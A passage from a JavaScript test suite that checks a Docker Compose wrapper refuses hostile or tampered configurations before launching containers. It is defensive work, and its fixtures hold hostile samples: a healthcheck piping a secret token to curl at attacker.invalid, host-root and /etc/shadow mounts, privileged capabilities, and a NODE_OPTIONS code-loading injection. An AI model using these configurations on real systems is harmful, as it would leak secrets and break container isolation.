        PLATFORM_COMPOSE_VARIANT: variant,
      });
      assert.notEqual(rejected.status, 0, `accepted invalid Compose variant ${JSON.stringify(variant)}`);
      assert.equal(fs.existsSync(sandbox.dockerMarker), false, "invalid variant reached the renderer");
      assert.match(rejected.stderr, /PLATFORM_COMPOSE_VARIANT/);
    }

    fs.rmSync(sandbox.dockerMarker, { force: true });
    const hosted = runWrapper(sandbox, ["config", "--format", "json"], {
      PLATFORM_COMPOSE_VARIANT: "LOCAL_PRIVATE",
      HOSTED_WORKLOAD_LOCK: sandbox.workloadLock,
      HOSTED_WORKLOAD_MODE: "hosted",
    });
    assert.notEqual(hosted.status, 0, "LOCAL_PRIVATE accepted a Hosted runtime");
    assert.equal(fs.existsSync(sandbox.dockerMarker), false, "Hosted LOCAL_PRIVATE reached the renderer");
    assert.match(hosted.stderr, /LOCAL_PRIVATE requires the exact no-hosted runtime/);
  } finally {
    removeSandbox(sandbox);
  }
});

test("V1 LOCAL_PRIVATE admits only its root-owned exact render environment and content-addressed release", () => {
  assert.match(composeVpsSource, /infrastructure_root=\/srv\/platform-infrastructure/);
  assert.match(composeVpsSource, /state_store=\/var\/lib\/platform-infrastructure\/v1/);
  assert.match(composeVpsSource, /release_mode" = 365/);
  assert.match(composeVpsSource, /env_mode" = 256/);
  const sandbox = createConsumerSandbox({ v1LocalPrivateAuthority: true });
  const invalidRelease = createConsumerSandbox({
    v1LocalPrivateAuthority: true,
    v1ReleaseId: "not-content-addressed",
  });
  const sentinel = "not-called\n";
  const resetMarker = (fixture) => fs.writeFileSync(fixture.dockerMarker, sentinel);
  const assertStoppedBeforeDocker = (fixture, result, label) => {
    assert.notEqual(result.status, 0, `${label} unexpectedly passed`);
    assert.equal(fs.readFileSync(fixture.dockerMarker, "utf8"), sentinel, `${label} reached Docker`);
  };
  const installLocalPrivateRender = (fixture) => {
    fs.chmodSync(fixture.root, 0o700);
    fixtureRootDirectory = fixture.root;
    try {
      const config = coreAuthorityConfig();
      config.secrets.control_center_first_configuration_bootstrap_token = {};
      config.secrets.control_center_first_configuration_keycloak_client_secret = {};
      writeDockerOutput(fixture, `${JSON.stringify(config)}\n`);
      fs.writeFileSync(path.join(fixture.scripts, "no-hosted-core-policy.mjs"), "process.exit(0);\n");
      return config;
    } finally {
      fs.chmodSync(fixture.root, 0o555);
    }
  };
  try {
    const config = installLocalPrivateRender(sandbox);
    assert.match(fs.readFileSync(sandbox.environmentFile, "utf8"), /^PLATFORM_COMPOSE_VARIANT=LOCAL_PRIVATE$/m);
    resetMarker(sandbox);
    const accepted = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(accepted.status, 0, accepted.stderr);
    assert.deepEqual(JSON.parse(accepted.stdout), config);
    assert.equal(fs.readFileSync(sandbox.dockerMarker, "utf8"), "", "authorized V1 render did not reach Docker");
    assert.match(
      fs.readFileSync(sandbox.dockerArgumentsCapture, "utf8"),
      /-f compose\.runtime-isolation\.yaml -f compose\.local-private\.yaml --profile backup config --format json/,
    );
    assert.doesNotMatch(
      fs.readFileSync(sandbox.dockerProcessEnvironmentCapture, "utf8"),
      /PLATFORM_V1_LOCAL_PRIVATE_RENDER|HOSTED_WORKLOAD_PREPARE_RESOLVED|PLATFORM_TRUSTED_RELEASE_CONTEXT/,
    );

    const identityFreeEnvironment = fs.readFileSync(sandbox.environmentFile, "utf8");
    const runtimeIdentity = {
      PLATFORM_RUNTIME_CANDIDATE_ID: "3".repeat(64),
      PLATFORM_RUNTIME_COMMIT: "4".repeat(40),
      PLATFORM_RUNTIME_TREE: "5".repeat(40),
      PLATFORM_RUNTIME_DEPLOYMENT_ID: `v1-local-private:${"6".repeat(64)}`,
      PLATFORM_RUNTIME_SOURCE_RENDER_SHA256: "7".repeat(64),
      PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256: "8".repeat(64),
    };
    fs.chmodSync(sandbox.environmentFile, 0o600);
    fs.writeFileSync(
      sandbox.environmentFile,
      `${identityFreeEnvironment}${Object.entries(runtimeIdentity).map(([name, value]) => `${name}=${value}\n`).join("")}`,
    );
    fs.chmodSync(sandbox.environmentFile, 0o400);
    Object.assign(sandbox.environment, runtimeIdentity);
    resetMarker(sandbox);
    const runtimeRender = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(runtimeRender.status, 0, runtimeRender.stderr);
    assert.match(
      fs.readFileSync(sandbox.dockerArgumentsCapture, "utf8"),
      /-f compose\.local-private\.yaml -f compose\.runtime-identity\.yaml --profile backup config --format json/,
    );
    for (const [name, value] of Object.entries(runtimeIdentity)) {
      assert.match(fs.readFileSync(sandbox.dockerEnvironmentCapture, "utf8"), new RegExp(`^${name}=${value}$`, "m"));
      delete sandbox.environment[name];
    }
    fs.chmodSync(sandbox.environmentFile, 0o600);
    fs.writeFileSync(sandbox.environmentFile, identityFreeEnvironment);
    fs.chmodSync(sandbox.environmentFile, 0o400);

    resetMarker(sandbox);
    const mixedAuthority = runWrapper(sandbox, ["config", "--format", "json"], {
      HOSTED_WORKLOAD_PREPARE_RESOLVED: "1",
    });
    assertStoppedBeforeDocker(sandbox, mixedAuthority, "mixed V1 and Hosted prepare authority");

    resetMarker(sandbox);
    const authority = sandbox.environment.PLATFORM_V1_LOCAL_PRIVATE_RENDER;
    delete sandbox.environment.PLATFORM_V1_LOCAL_PRIVATE_RENDER;
    const unbound = runWrapper(sandbox, ["config", "--format", "json"]);
    sandbox.environment.PLATFORM_V1_LOCAL_PRIVATE_RENDER = authority;
    assertStoppedBeforeDocker(sandbox, unbound, "missing V1 authority mode");

    resetMarker(sandbox);
    fs.chmodSync(sandbox.environmentFile, 0o600);
    const writableEnvironment = runWrapper(sandbox, ["config", "--format", "json"]);
    fs.chmodSync(sandbox.environmentFile, 0o400);
    assertStoppedBeforeDocker(sandbox, writableEnvironment, "mode-0600 V1 environment");

    resetMarker(sandbox);
    const hardLink = path.join(path.dirname(sandbox.environmentFile), "exact-compose.link");
    fs.linkSync(sandbox.environmentFile, hardLink);
    const linkedEnvironment = runWrapper(sandbox, ["config", "--format", "json"]);
    fs.unlinkSync(hardLink);
    assertStoppedBeforeDocker(sandbox, linkedEnvironment, "hard-linked V1 environment");

    resetMarker(sandbox);
    const retainedEnvironment = `${sandbox.environmentFile}.retained`;
    fs.renameSync(sandbox.environmentFile, retainedEnvironment);
    fs.symlinkSync(retainedEnvironment, sandbox.environmentFile);
    const symlinkEnvironment = runWrapper(sandbox, ["config", "--format", "json"]);
    fs.unlinkSync(sandbox.environmentFile);
    fs.renameSync(retainedEnvironment, sandbox.environmentFile);
    assertStoppedBeforeDocker(sandbox, symlinkEnvironment, "symlinked V1 environment");

    resetMarker(sandbox);
    const alternateEnvironment = path.join(path.dirname(sandbox.environmentFile), "alternate.env");
    fs.copyFileSync(sandbox.environmentFile, alternateEnvironment);
    fs.chmodSync(alternateEnvironment, 0o400);
    const wrongPath = runWrapper(sandbox, ["config", "--format", "json"], {
      COMPOSE_ENV_FILE: alternateEnvironment,
    });
    assertStoppedBeforeDocker(sandbox, wrongPath, "wrong V1 environment path");

    resetMarker(sandbox);
    fs.chmodSync(sandbox.root, 0o755);
    const mutableRelease = runWrapper(sandbox, ["config", "--format", "json"]);
    fs.chmodSync(sandbox.root, 0o555);
    assertStoppedBeforeDocker(sandbox, mutableRelease, "mutable V1 release root");

    installLocalPrivateRender(invalidRelease);
    resetMarker(invalidRelease);
    const unboundRelease = runWrapper(invalidRelease, ["config", "--format", "json"]);
    assertStoppedBeforeDocker(invalidRelease, unboundRelease, "non-content-addressed V1 release");
  } finally {
    removeSandbox(sandbox);
    removeSandbox(invalidRelease);
  }
});

test("QA6 Hosted envelope binds the exact descriptor render digest before runtime policy", () => {
  const sandbox = addInfraConsumer(createConsumerSandbox());
  try {
    const protectedResourceNames = structuredClone(expectedCoreInventory);
    const configA = coreRuntimeConfig(protectedResourceNames, { hosted: true });
    const configB = structuredClone(configA);
    configB.services["example-app-web"].image =
      `example.invalid/example-app@sha256:${"b".repeat(64)}`;
    const reorderedConfig = Object.fromEntries(Object.entries(configA).reverse());
    assert.deepEqual(reorderedConfig, configA);
    for (const [label, config] of [
      ["baseline", configA],
      ["image mutation", configB],
      ["semantic-equivalent byte mutation", reorderedConfig],
    ]) {
      const policy = evaluateRuntimeIsolation(config, {
        projectName: "platform_infra_vps",
        protectedResourceNames,
        protectedNetworkNames: protectedResourceNames.networks,
      });
      assert.equal(policy.status, "passed", `${label} must remain policy-valid: ${policy.failures.join("\n")}`);
    }
    const baselineBytes = `${JSON.stringify(configA)}\n`;
    fs.writeFileSync(
      sandbox.environmentFile,
      `HOSTED_WORKLOAD_LOCK=${sandbox.workloadLock}\nHOSTED_WORKLOAD_MODE=hosted\nCORE_VALUE=trusted\n`,
      { mode: 0o600 },
    );
    writeActivationBundle(
      sandbox,
      activationBundle(sandbox, protectedResourceNames, baselineBytes),
    );
    writeDockerOutput(sandbox, baselineBytes);
    const baseline = runInfraConsumer(sandbox);
    assert.equal(baseline.status, 0, baseline.stderr);

    const acceptedMutations = [];
    for (const [label, bytes] of [
      ["image mutation", `${JSON.stringify(configB)}\n`],
      ["semantic-equivalent whitespace/key-order mutation", `${JSON.stringify(reorderedConfig, null, 2)}\n`],
    ]) {
      assert.notEqual(bytes, baselineBytes, `${label} did not alter renderer bytes`);
      writeDockerOutput(sandbox, bytes);
      const substituted = runInfraConsumer(sandbox);
      if (substituted.status === 0) acceptedMutations.push(label);
    }
    assert.deepEqual(
      acceptedMutations,
      [],
      `combinedRenderSha256 accepted renderer substitutions: ${acceptedMutations.join(", ")}`,
    );
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 wrapper accepts exactly one JSON object and consumes that exact object", () => {
  const sandbox = createConsumerSandbox();
  try {
    const config = coreRuntimeConfig(sandbox.inventory);
    const baselineDocument = `${JSON.stringify(config)}\n`;
    writeDockerOutput(sandbox, baselineDocument);
    const baseline = runWrapper(sandbox);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.deepEqual(JSON.parse(baseline.stdout).config, config);

    const invalidStreams = new Map([
      ["zero documents", ""],
      ["two objects", `${JSON.stringify(config)}\n{}\n`],
      ["leading object", `{}\n${JSON.stringify(config)}\n`],
      ["leading scalar", `0\n${JSON.stringify(config)}\n`],
      ["trailing scalar", `${JSON.stringify(config)}\n0\n`],
      ["leading null", `null\n${JSON.stringify(config)}\n`],
      ["trailing array", `${JSON.stringify(config)}\n[]\n`],
    ]);
    const accepted = [];
    for (const [label, stream] of invalidStreams) {
      writeDockerOutput(sandbox, stream);
      const result = runWrapper(sandbox);
      if (result.status === 0) accepted.push(label);
    }
    assert.deepEqual(accepted, [], `wrapper accepted non-singleton JSON streams: ${accepted.join(", ")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted compose-config validates and forwards one exact renderer byte stream", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    const config = coreAuthorityConfig();
    const baselineBytes = `${JSON.stringify(config, null, 2)}\n`;
    writeDockerOutput(sandbox, baselineBytes);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1, "baseline no-hosted config rendered more than once");
    assert.equal(baseline.stdout, baselineBytes, "validated no-hosted config bytes were not forwarded exactly");
    assert.equal(sha256(baseline.stdout), sha256(baselineBytes));
    const forwarded = JSON.parse(baseline.stdout);
    for (const kind of protectedKinds) {
      assert.deepEqual(
        Object.keys(forwarded[kind]).sort(),
        expectedCoreInventory[kind],
        `baseline ${kind} differs from canonical no-hosted authority`,
      );
    }

    const invalidStreams = new Map([
      ["zero documents", ""],
      ["two objects", `${JSON.stringify(config)}\n{}\n`],
      ["leading scalar", `0\n${JSON.stringify(config)}\n`],
      ["trailing scalar", `${JSON.stringify(config)}\n0\n`],
    ]);
    const accepted = [];
    for (const [label, bytes] of invalidStreams) {
      renderer.reset();
      writeDockerOutput(sandbox, bytes);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second no-hosted render`);
      if (result.status === 0 || result.stdout.length > 0) {
        accepted.push({ label, status: result.status, stdoutBytes: result.stdout.length });
      }
    }
    assert.deepEqual(accepted, [], `no-hosted config accepted non-singleton JSON streams: ${JSON.stringify(accepted)}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted compose-config rejects extra and same-name hostile core authority", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    const extraService = coreAuthorityConfig();
    extraService.services["attacker-daemon"] = hostileCoreService();
    const sameNameMutation = coreAuthorityConfig();
    sameNameMutation.services.alertmanager = hostileCoreService({
      image: sameNameMutation.services.alertmanager.image,
    });
    assert.deepEqual(
      Object.keys(sameNameMutation.services).sort(),
      expectedCoreInventory.services,
      "same-name hostile fixture accidentally changed service inventory",
    );

    const accepted = [];
    for (const [label, config] of [
      ["extra attacker-daemon", extraService],
      ["same-name alertmanager mutation", sameNameMutation],
    ]) {
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second no-hosted render`);
      if (result.status === 0 || result.stdout.length > 0) {
        accepted.push({ label, status: result.status, stdoutBytes: result.stdout.length });
      } else {
        assert.match(
          result.stderr,
          /no-hosted|semantic|runtime|isolation|inventory|authority|resource|mismatch|forbidden/i,
          `${label} failed for an unrelated reason:\n${result.stderr}`,
        );
      }
    }
    assert.deepEqual(accepted, [], `no-hosted config forwarded hostile authority: ${JSON.stringify(accepted)}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 core activation rejects hostile no-hosted renders before create and start", () => {
  const extraService = coreAuthorityConfig();
  extraService.services["attacker-daemon"] = hostileCoreService();
  const sameNameMutation = coreAuthorityConfig();
  sameNameMutation.services.alertmanager = hostileCoreService({
    image: sameNameMutation.services.alertmanager.image,
  });
  const violations = [];
  for (const [label, config] of [
    ["extra attacker-daemon", extraService],
    ["same-name alertmanager mutation", sameNameMutation],
  ]) {
    const scenario = runCoreStackNoHostedScenario(config);
    try {
      const trace = scenario.log.trim().split("\n").filter(Boolean);
      const renderCalls = trace.filter((line) =>
        line.startsWith("compose ") && line.endsWith(" config --format json"));
      const createCalls = trace.filter((line) => /(?:^| )create(?: |$)/.test(line));
      const startCalls = trace.filter((line) =>
        /^--host unix:\/\/\/var\/run\/docker\.sock start(?: |$)/.test(line));
      assert.equal(renderCalls.length, 1, `${label} did not acquire exactly one renderer stream:\n${scenario.log}`);
      if (scenario.result.status === 0 || createCalls.length > 0 || startCalls.length > 0
          || /Core activation gate completed/.test(scenario.result.stdout)) {
        violations.push({
          label,
          status: scenario.result.status,
          createCalls,
          startCalls,
          completed: /Core activation gate completed/.test(scenario.result.stdout),
        });
      } else {
        assert.match(
          scenario.result.stderr,
          /no-hosted|semantic|runtime|isolation|inventory|authority|resource|mismatch|forbidden/i,
          `${label} was stopped for an unrelated reason:\n${scenario.result.stderr}`,
        );
      }
    } finally {
      fs.rmSync(scenario.root, { recursive: true, force: true });
    }
  }
  assert.deepEqual(
    violations,
    [],
    `hostile no-hosted render reached a core mutation sink: ${JSON.stringify(violations)}`,
  );
});

test("QA7 no-hosted rejects each isolated privileged core capability", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);
    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
    const mutations = [
      ["privileged", (service) => { service.privileged = true; }],
      ["pid host", (service) => { service.pid = "host"; }],
      ["network host", (service) => { service.network_mode = "host"; }],
      ["SYS_ADMIN", (service) => { service.cap_add = ["SYS_ADMIN"]; }],
      ["device", (service) => { service.devices = ["/dev/null:/dev/qa7"]; }],
      ["root bind", (service) => {
        service.volumes = [{ type: "bind", source: "/", target: "/host" }];
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config.services.alertmanager);
      assert.deepEqual(Object.keys(config.services).sort(), expectedCoreInventory.services);
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(result.status, 0, `${label} was accepted`);
      assert.equal(result.stdout, "", `${label} leaked an unvalidated render`);
      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
      assert.match(result.stderr, /semantic authority|runtime isolation/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted rejects isolated top-level and sensitive-source authority mutations", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);
    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
    const mutations = [
      ["config host file", (config) => {
        config.configs.enterprise_traefik_routes = { file: "/etc/shadow" };
      }],
      ["secret host file", (config) => {
        config.secrets["smtp_password"] = { file: "/etc/shadow" };
      }],
      ["volume driver opts", (config) => {
        config.volumes.enterprise_redis_data = {
          name: "enterprise_redis_data",
          driver_opts: { type: "none", o: "bind", device: "/" },
        };
      }],
      ["network driver opts", (config) => {
        config.networks.platform_cache = {
          internal: true,
          driver_opts: { "com.docker.network.bridge.name": "host0" },
        };
      }],
      ["sensitive allowed-target bind", (config) => {
        config.services.alertmanager.volumes = [{
          type: "bind",
          source: "/etc/shadow",
          target: "/etc/alertmanager/alertmanager.yml",
          read_only: true,
        }];
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      for (const kind of protectedKinds) {
        assert.deepEqual(Object.keys(config[kind]).sort(), expectedCoreInventory[kind]);
      }
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(result.status, 0, `${label} was accepted`);
      assert.equal(result.stdout, "", `${label} leaked an unvalidated render`);
      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
      assert.match(result.stderr, /semantic authority|runtime isolation/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted accepts canonical workspace sources and rejects escapes", () => {
  const sandbox = createConsumerSandbox();
  const environmentWithoutPhpSource = requiredCoreEnvironmentLines
    .filter((line) => !line.startsWith("PHP_PROJECTS_DIR="));
  const setSourceMounts = (config, phpSource) => {
    for (const serviceName of ["control-center", "project-router"]) {
      const mount = config.services[serviceName].volumes
        .find((entry) => entry.target === "/var/www/projects");
      mount.source = phpSource;
    }
  };
  try {
    const renderer = installCountingRenderer(sandbox);
    const documentedSource = path.join(
      sandbox.cleanupRoot,
      "applications",
      "example-app",
    );
    fs.writeFileSync(
      sandbox.environmentFile,
      [
        "HOSTED_WORKLOAD_LOCK=",
        "HOSTED_WORKLOAD_MODE=no-hosted",
        "DOMAIN=fixture.invalid",
        ...environmentWithoutPhpSource,
        "PHP_PROJECTS_DIR=../applications/example-app",
        "PROJECT_SOURCE_DIR=../applications/example-app",
        "",
      ].join("\n"),
      { mode: 0o600 },
    );
    const documented = coreAuthorityConfig();
    setSourceMounts(documented, documentedSource, documentedSource);
    const documentedAuthority = evaluateCurrentNoHostedExactAuthority(
      JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8")),
      documented,
      sandbox.root,
      readCoreTestEnvironment(),
    );
    assert.deepEqual(documentedAuthority.violations, []);
    writeDockerOutput(sandbox, `${JSON.stringify(documented)}\n`);
    const accepted = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(accepted.status, 0, accepted.stderr);
    assert.equal(renderer.count(), 1);

    fs.writeFileSync(
      sandbox.environmentFile,
      [
        "HOSTED_WORKLOAD_LOCK=",
        "HOSTED_WORKLOAD_MODE=no-hosted",
        "DOMAIN=fixture.invalid",
        ...environmentWithoutPhpSource,
        "PHP_PROJECTS_DIR=/etc",
        "PROJECT_SOURCE_DIR=/etc",
        "",
      ].join("\n"),
      { mode: 0o600 },
    );
    const absoluteEscape = coreAuthorityConfig();
    setSourceMounts(absoluteEscape, "/etc", "/etc");
    renderer.reset();
    writeDockerOutput(sandbox, `${JSON.stringify(absoluteEscape)}\n`);
    const absoluteRejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(absoluteRejected.status, 0, "absolute workspace escape was accepted");
    assert.equal(absoluteRejected.stdout, "");
    assert.match(absoluteRejected.stderr, /semantic authority/i);

    const symlinkSource = path.join(sandbox.cleanupRoot, "applications", "escape");
    fs.symlinkSync("/etc", symlinkSource);
    fs.writeFileSync(
      sandbox.environmentFile,
      [
        "HOSTED_WORKLOAD_LOCK=",
        "HOSTED_WORKLOAD_MODE=no-hosted",
        "DOMAIN=fixture.invalid",
        ...environmentWithoutPhpSource,
        "PHP_PROJECTS_DIR=../applications/escape",
        "PROJECT_SOURCE_DIR=../applications/escape",
        "",
      ].join("\n"),
      { mode: 0o600 },
    );
    const symlinkEscape = coreAuthorityConfig();
    setSourceMounts(symlinkEscape, symlinkSource, symlinkSource);
    renderer.reset();
    writeDockerOutput(sandbox, `${JSON.stringify(symlinkEscape)}\n`);
    const symlinkRejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(symlinkRejected.status, 0, "symlink workspace escape was accepted");
    assert.equal(symlinkRejected.stdout, "");
    assert.match(symlinkRejected.stderr, /semantic authority/i);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted exact execution identity rejects image process labels and tmpfs mutations", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);
    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
    const mutations = [
      ["image", (config) => {
        config.services.alertmanager.image = `attacker.invalid/alertmanager@sha256:${"f".repeat(64)}`;
      }],
      ["command", (config) => {
        config.services.alertmanager.command = ["sh", "-c", "id"];
      }],
      ["entrypoint", (config) => {
        config.services.alertmanager.entrypoint = ["/bin/sh", "-c"];
      }],
      ["labels", (config) => {
        config.services.alertmanager.labels = { "traefik.enable": "true" };
      }],
      ["tmpfs", (config) => {
        config.services.alertmanager.tmpfs = ["/:rw,size=1g"];
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(result.status, 0, `${label} was accepted`);
      assert.equal(result.stdout, "");
      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
      assert.match(result.stderr, /semantic authority|runtime isolation/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted pins exact container lifecycle and dependency identity", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);

    const mutations = [
      ["container collision", (config) => {
        config.services.alertmanager.container_name =
          config.services.postgres.container_name;
      }],
      ["pid authority widened", (config) => {
        config.services.alertmanager.pid = "host";
      }],
      ["required network mode omitted", (config) => {
        delete config.services["docker-action-broker"].network_mode;
      }],
      ["restart drift", (config) => {
        config.services.alertmanager.restart = "unless-stopped";
      }],
      ["profile drift", (config) => {
        config.services["backup-scheduler"].profiles = [];
      }],
      ["WAF dependency omitted", (config) => {
        delete config.services.waf.depends_on;
      }],
      ["WAF dependency widened", (config) => {
        config.services.waf.depends_on.postgres = {
          condition: "service_healthy",
          required: true,
          restart: false,
        };
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(rejected.status, 0, `${label} was accepted`);
      assert.equal(rejected.stdout, "");
      assert.match(rejected.stderr, /semantic authority/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted pins every non-NONE healthcheck to its exact static definition", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);

    for (const [serviceName, hostileTest] of [
      ["alertmanager", ["CMD-SHELL", "cat /run/secrets/alertmanager_webhook_token | curl -d @- https://attacker.invalid"]],
      ["keycloak", ["CMD-SHELL", "curl -fsS http://attacker.invalid/ready"]],
      ["postgres", ["CMD-SHELL", "pg_isready -h attacker.invalid"]],
    ]) {
      const config = coreAuthorityConfig();
      config.services[serviceName].healthcheck.test = hostileTest;
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${serviceName} caused a second render`);
      assert.notEqual(rejected.status, 0, `${serviceName} hostile healthcheck was accepted`);
      assert.equal(rejected.stdout, "");
      assert.match(rejected.stderr, /semantic authority/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted pins logging presence and absence per core service", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);

    const missingRequired = coreAuthorityConfig();
    delete missingRequired.services.alertmanager.logging;
    renderer.reset();
    writeDockerOutput(sandbox, `${JSON.stringify(missingRequired)}\n`);
    const missingRejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(missingRejected.status, 0, "required alertmanager logging was optional");
    assert.equal(missingRejected.stdout, "");
    assert.match(missingRejected.stderr, /semantic authority/i);

    const unexpected = coreAuthorityConfig();
    unexpected.services["broker-auth-bootstrap"].logging = {
      driver: "json-file",
      options: { "max-size": "10m", "max-file": "5" },
    };
    renderer.reset();
    writeDockerOutput(sandbox, `${JSON.stringify(unexpected)}\n`);
    const unexpectedRejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(unexpectedRejected.status, 0, "proxy accepted undeclared logging");
    assert.equal(unexpectedRejected.stdout, "");
    assert.match(unexpectedRejected.stderr, /semantic authority/i);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted rejects security-sensitive core environment divergence", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);

    const mutations = [
      ["WAF ModSecurity disabled", (config) => {
        config.services.waf.environment.MODSEC_RULE_ENGINE = "Off";
      }],
      ["WAF anomaly threshold widened", (config) => {
        config.services.waf.environment.ANOMALY_INBOUND = "999999";
      }],
      ["control-center issuer redirected", (config) => {
        config.services["control-center"].environment.CONTROL_CENTER_OIDC_ISSUER =
          "https://attacker.invalid/realms/platform";
      }],
      ["backup retention apply mismatch", (config) => {
        config.services["backup-scheduler"].environment
          .BACKUP_SCHEDULER_ENABLE_RETENTION_APPLY = "true";
      }],
      ["Node option injection", (config) => {
        config.services["control-center"].environment.NODE_OPTIONS =
          "--require=/tmp/attacker.cjs";
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(rejected.status, 0, `${label} was accepted`);
      assert.equal(rejected.stdout, "");
      assert.match(rejected.stderr, /semantic authority/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted semantic projection follows the exact trusted env snapshot", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    const environmentBytes = [
      "HOSTED_WORKLOAD_LOCK=",
      "HOSTED_WORKLOAD_MODE=no-hosted",
      "DOMAIN=parity.invalid",
      "ALERTMANAGER_SECRET_GID=2222",
